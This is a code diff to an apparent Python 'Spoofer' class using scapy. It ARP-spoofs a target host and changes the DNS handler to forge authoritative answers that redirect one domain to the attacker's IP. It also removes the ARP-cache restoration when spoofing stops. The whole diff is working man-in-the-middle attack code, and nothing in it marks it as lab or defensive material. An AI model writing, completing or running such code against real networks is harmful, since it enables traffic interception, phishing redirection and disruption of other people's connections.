@@ -17,11 +17,12 @@ class Spoofer:
         self.__router_ip = router_ip
         # Getting mac of the target
         # self.__target_mac = self.get_mac(self.__target_ip)
-        self.__target_mac = "42:af:e2:f9:96:4a"
+        self.__target_mac = "46:7A:60:FD:EA:D6"
 
     def send_spoofed_packet(self): # Main
         """sending spoofed packet.
         """
+        #print("Send spoofing packet")
         # generating the spoofed packet modifying the source and the target
         packet = ARP(op=2, # request
                         hwdst=self.__target_mac, # mac destination - target mac
@@ -37,7 +38,7 @@ class Spoofer:
     def checkout(self):
         """stop spoofing.
         """
-        self.restore_defaults(self.__target_ip,self.__ip)
+        pass
 
     def restore_defaults(self,dest, source):
         # getting the real MACs
@@ -75,32 +76,39 @@ class Spoofer:
         When sniffing a dns packet from target:
         Extract domain name -> If is in url dict, replace for actual domain name -> Send dns query to dns server -> receive dns response -> Modify ip src and dst -> Send dns response to target.
         """
-        if DNS in packet and packet[DNS].qr == 0: # Check if packet is a dns query.
-            dns_layer = packet[DNS]
-            domain: str = dns_layer.qd.qname.decode() # Retrieve domain.
-            urls: dict[str,str] = self.get_urls()
-            if domain in urls.keys():
-                # Create DNS response with 127.0.0.1
-                response_packet = IP(dst=self.__target_ip) / UDP(sport=53, dport=53) / DNS(
-                    qr=1,  # This is a response
-                    rd=1,  # Recursion Desired
-                    ra=1,  # Recursion Available
-                    qd=DNSQR(qname=domain),  # Question section
-                    an=DNSRR(  # Answer section
-                        rrname=domain,
-                        ttl=60,
-                        rdata="127.0.0.1"
+        # Check if packet is a DNS query
+        #print("Found packets")
+        if packet.haslayer(DNSQR) and packet[DNS].qr == 0:
+
+
+            #print("Found dns packets")
+            domain = packet[DNSQR].qname.decode().rstrip(".")
+            if 'info' in domain:
+                pass
+            if domain == "www.techqng.info.com":
+                #print(f"Intercepted DNS query for {domain}")
+
+                # Craft spoofed DNS response
+                response_packet = (
+                    IP(dst=packet[IP].src, src=packet[IP].dst) /
+                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
+                    DNS(
+                        id=packet[DNS].id,  # Match query ID
+                        qr=1,            # Response flag
+                        aa=1,            # Authoritative answer
+                        qd=packet[DNS].qd,  # Copy query section
+                        an=DNSRR(rrname=domain, type="A", ttl=300, rdata=self.__ip)
                     )
                 )
-                ver = True
-                # record_entry(domain,self.build_dict_from_packet(packet))
-            else:
-                ver = False
-                response_packet = self.nslookup(domain)
 
-            response_packet[IP].src,response_packet[IP].dst = packet[IP].dst,packet[IP].src
-            # Modify the response packet, so it will match target's original query.
-            scapy.send(response_packet,verbose=ver) #type:ignore
+                # Send spoofed response
+                scapy.send(response_packet, verbose=0)
+                print(f"Spoofed DNS response sent: {domain} -> {self.__ip}")
+            else:
+                response_packet = self.nslookup(domain)
+                response_packet[IP].src,response_packet[IP].dst = packet[IP].dst,packet[IP].src
+                # Modify the response packet, so it will match target's original query.
+                scapy.send(response_packet,verbose=0) #type:ignore
 
     def forward_to_router(self):
         """
@@ -108,7 +116,9 @@ class Spoofer:
         When the spoofing starts taking effect, all of the target computer's traffic will reach this machine.
         Using scapy to sniff all of the packets from target to router, and calling process_packet to handle them.
         """
-        scapy.sniff(filter=f"ip src {self.__target_ip} and ip dst not {self.__ip}",prn=self.process_packet,store=0)
+        while True:
+            scapy.sniff(filter=f"udp port 53",prn=self.process_packet,store=0,timeout=1)
+            self.urls = self.get_urls()
         # Capture all packets sent from the target, and not meant for host. because of the ARP spoofing, this packets are meant to be sent to the router.
         # Dump all corresponding packets into process_packet to handle.
 
